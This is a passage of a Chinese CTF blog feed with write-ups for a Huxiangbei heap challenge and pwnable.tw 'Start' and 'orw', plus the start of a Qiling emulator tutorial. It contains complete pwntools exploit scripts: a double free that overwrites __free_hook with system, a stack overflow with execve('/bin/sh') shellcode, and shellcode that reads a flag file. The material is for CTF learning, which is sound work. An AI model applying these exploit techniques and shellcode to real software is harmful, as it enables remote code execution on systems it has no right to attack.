keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"index?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>dele功能存在越界删除</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"index?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0x20</span> <span class="token operator">&amp;&amp;</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0xF8</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">safe_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>edit功能中存在一个<code>off-by-null</code>，但实际上没有用，只是迷惑作用</p><p>整体思路如下：我们先通过越界读泄露出libc基地址和程序加载基地址，然后再泄露堆地址，获取一个chunk的地址。然后先free掉一个chunk，然后将这个被free的chunk的地址写到另一个chunk中(其实也不用写，free成链之后chunk中自然就留下了另一个chunk的地址)，如下</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/7.jpg" alt=""></p><p>然后，由于我们泄露出了程序加载基地址，我们就能够算出堆地址存储的真实地址，然后用(<code>0x55a36bccf360</code>-堆地址存储的真实地址)/8得到其相应的index，再通过dele功能进行删除，就能够造成<code>double free</code>，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">14</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ec760</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">)</span>pro_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x202008</span>heap_store<span class="token operator">=</span>pro_base<span class="token operator">+</span><span class="token number">0x202040</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'pro_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pro_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'heap_store => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>heap_store<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>heap_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x260</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'heap_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x260</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset<span class="token operator">=</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x260</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">-</span>heap_store<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span>dele<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x5-总结"><a href="#0x5-总结" class="headerlink" title="0x5.总结"></a>0x5.总结</h2><p>还是太菜了，要多的东西还有很多很多啊</p><p>参考文章</p><ul><li><a href="https://www.anquanke.com/post/id/89855" target="_blank" rel="noopener">https://www.anquanke.com/post/id/89855</a></li><li><a href="https://ray-cp.github.io/archivers/%E5%BC%BA%E7%BD%91%E6%9D%AF-pwn-writeup" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/%E5%BC%BA%E7%BD%91%E6%9D%AF-pwn-writeup</a></li><li><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上周末打了打湖湘杯，还是太菜了&lt;/p&gt;
&lt;h2 id=&quot;0x1-pwn1-pwn-printf&quot;&gt;&lt;a href=&quot;#0x1-pwn1-pwn-printf&quot; class=&quot;headerlink&quot; title=&quot;0x1.pwn1-pwn_printf&quot;&gt;&lt;/a&gt;0x1.pw
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="PWN" scheme="https://lawliet.ren/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>qemu pwn学习</title>
    <link href="https://lawliet.ren/2020/10/30/qemu-pwn-xue-xi/"/>
    <id>https://lawliet.ren/2020/10/30/qemu-pwn-xue-xi/</id>
    <published>2020-10-30T05:26:58.000Z</published>
    <updated>2020-10-30T05:26:58.095Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pwnable.tw 刷题</title>
    <link href="https://lawliet.ren/2020/10/14/pwnable-tw-shua-ti/"/>
    <id>https://lawliet.ren/2020/10/14/pwnable-tw-shua-ti/</id>
    <published>2020-10-14T12:03:00.000Z</published>
    <updated>2020-10-15T13:37:37.347Z</updated>
    
    <content type="html"><![CDATA[<p>开始刷pwnable.tw这个高质量平台的题目了，做一下记录</p><h2 id="0x1-Start"><a href="#0x1-Start" class="headerlink" title="0x1.Start"></a>0x1.Start</h2><p>检查保护</p><p><img src="/LawlietLW.github.io/2020/10/14/pwnable-tw-shua-ti/1.jpg" alt=""></p><p>什么保护都没有</p><p>载入IDA看看</p><p><img src="/LawlietLW.github.io/2020/10/14/pwnable-tw-shua-ti/2.jpg" alt=""></p><p>程序很简短，一个start一个exit</p><p>分析汇编代码，程序首先将exit函数压入栈中，然后压入0x14字节大小的字符串，调用write打印0x14长度的字符串，随后调用read读入0x3c大小的数据，于是这里就存在栈溢出。</p><p>由于程序是汇编写的，不能通过ROP来获取shell，加上程序没开nx保护，我们使用shellcode来获取shell。构造出如下的栈空间：</p><p><img src="/LawlietLW.github.io/2020/10/14/pwnable-tw-shua-ti/stack.jpg" alt=""></p><p>首先我们来泄露栈地址，需要利用程序中的write系统调用，我们将返回地址覆盖为<code>0x08048087</code></p><pre class=" language-assembly"><code class="language-assembly">.text:08048087                 mov     ecx, esp        ; addr.text:08048089                 mov     dl, 14h         ; len.text:0804808B                 mov     bl, 1           ; fd.text:0804808D                 mov     al, 4.text:0804808F                 int     80h             ; LINUX - sys_write.text:08048091                 xor     ebx, ebx.text:08048093                 mov     dl, 3Ch ; '<'.text:08048095                 mov     al, 3.text:08048097                 int     80h             ; LINUX -.text:08048099                 add     esp, 14h.text:0804809C                 retn</code></pre><p>这样就会打印出esp的值，于ret_addr+4相差0x14，等到下一次输入的时候我们将返回地址覆盖为stack+0x14，再将ret_addr+4覆盖为shellcode，完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./start'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./start'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('chall.pwnable.tw', 10000)</span>gadget <span class="token operator">=</span> <span class="token number">0x8048087</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x14</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>stack <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x14</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcodeio<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x2-orw"><a href="#0x2-orw" class="headerlink" title="0x2.orw"></a>0x2.orw</h2><p>检查保护</p><p><img src="/LawlietLW.github.io/2020/10/14/pwnable-tw-shua-ti/3.jpg" alt=""></p><p>IDA分析</p><p><img src="/LawlietLW.github.io/2020/10/14/pwnable-tw-shua-ti/4.jpg" alt=""></p><p>程序有一个沙箱函数，检测一下</p><p><img src="/LawlietLW.github.io/2020/10/14/pwnable-tw-shua-ti/5.jpg" alt=""></p><p>限制我们使用open、read、write函数</p><p>继续看程序，直接让我们输入shellcode，然后执行shellcode</p><p>所以程序就是让我们写一个orw的shellcode</p><p>没啥好说的，直接上exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary<span class="token operator">=</span><span class="token string">'./orw'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'orw'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('chall.pwnable.tw', 10001)</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''push 0x00006761push 0x6c662f77push 0x726f2f65push 0x6d6f682fmov eax,0x5mov ebx,espxor ecx,ecxint 0x80mov ebx,eaxmov ecx,espmov edx,0x30mov eax,0x3int 0x80mov ebx,1mov eax,0x4int 0x80'''</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x3-calc"><a href="#0x3-calc" class="headerlink" title="0x3.calc"></a>0x3.calc</h2><p>这题实现了一个计算器的功能，然而我搞不定，只能看大佬的wp</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;开始刷pwnable.tw这个高质量平台的题目了，做一下记录&lt;/p&gt;
&lt;h2 id=&quot;0x1-Start&quot;&gt;&lt;a href=&quot;#0x1-Start&quot; class=&quot;headerlink&quot; title=&quot;0x1.Start&quot;&gt;&lt;/a&gt;0x1.Start&lt;/h2&gt;&lt;p&gt;检查保护
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="pwn" scheme="https://lawliet.ren/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qiling框架学习</title>
    <link href="https://lawliet.ren/2020/09/19/qiling-kuang-jia-xue-xi/"/>
    <id>https://lawliet.ren/2020/09/19/qiling-kuang-jia-xue-xi/</id>
    <published>2020-09-19T02:59:53.000Z</published>
    <updated>2020-09-19T14:41:34.164Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/qilingframework/qiling" target="_blank" rel="noopener">qiling</a>框架能够做到</p><blockquote><p>麒麟框架不仅仅是一个仿真平台或逆向工程工具。它还将“二进制插桩”和“二进制仿真”结合一起。并解决了应用程序不能在隔离环境里运行并且高度依赖于操作系统的问题。由于大量的操作系统支持，麒麟框架为二进制分析提供了无限的可能性和潜力。使用麒麟框架，你可以：</p><ul><li>跨平台：Windows、MacOS、Linux、BSD、UEFI、DOS</li><li>跨体系结构：X86、X86 64位、ARM、ARM 64位、MIPS、8086</li><li>多种文件格式：PE、MachO、ELF、COM</li><li>在隔离环境中模拟沙盒机器代码</li><li>支持跨体系结构和平台调试功能</li><li>提供高级API来设置和配置沙盒</li><li>细化检测：允许不同级别的钩子（指令/基本块/内存访问/异常/系统调用/IO等）</li><li>允许动态热补丁运行代码，包括加载的库</li></ul><p>麒麟框架能够模拟：</p><ul><li>Windows x86 32/64位</li><li>Linux x86 32/64位，ARM，AARCH64，MIPS</li><li>MacOS x86 32/64位</li><li>FreeBSD x86 32/64位</li><li>UEFI</li><li>DOS</li><li>MBR</li></ul><p>麒麟框架能够在Linux/MacOS/FreeBSD/Windows(WSL2)等操作系统上运行，且不受CPU架构所限制</p></blockquote><p>感觉是个挺有用挺好玩的框架，上手学一下</p><h3 id="0x1-运行不同架构的程序"><a href="#0x1-运行不同架构的程序" class="headerlink" title="0x1.运行不同架构的程序"></a>0x1.运行不同架构的程序</h3><p>来个最简单的helloworld程序，mips小端序架构</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>用qemu运行使用以下命令</p><pre class=" language-shell"><code class="language-shell">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./hello</code></pre><p>用qiling运行使用如下脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token keyword">from</span> qiling <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">mysandbox</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>rootfs<span class="token punctuation">)</span><span class="token punctuation">:</span>    ql<span class="token operator">=</span>Qiling<span class="token punctuation">(</span>path<span class="token punctuation">,</span>rootfs<span class="token punctuation">,</span>output<span class="token operator">=</span><span class="token string">'default'</span><span class="token punctuation">)</span>    ql<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    mysandbox<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'/usr/mipsel-linux-gnu'</span><span class="token punctuation">)</span></code></pre><p>我们先运行一下，看看效果</p><pre class=" language-c"><code class="language-c">root@IOT<span class="token punctuation">:</span><span class="token operator">~</span># <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python3 <span class="token string">"/root/demo.py"</span><span class="token function">brk</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token function">mmap2</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x802</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x774bf000</span><span class="token function">uname</span><span class="token punctuation">(</span><span class="token number">0x7ff3c728</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token operator">/</span>etc<span class="token operator">/</span>ld<span class="token punctuation">.</span>so<span class="token punctuation">.</span>nohwcap<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token function">access</span><span class="token punctuation">(</span><span class="token operator">/</span>etc<span class="token 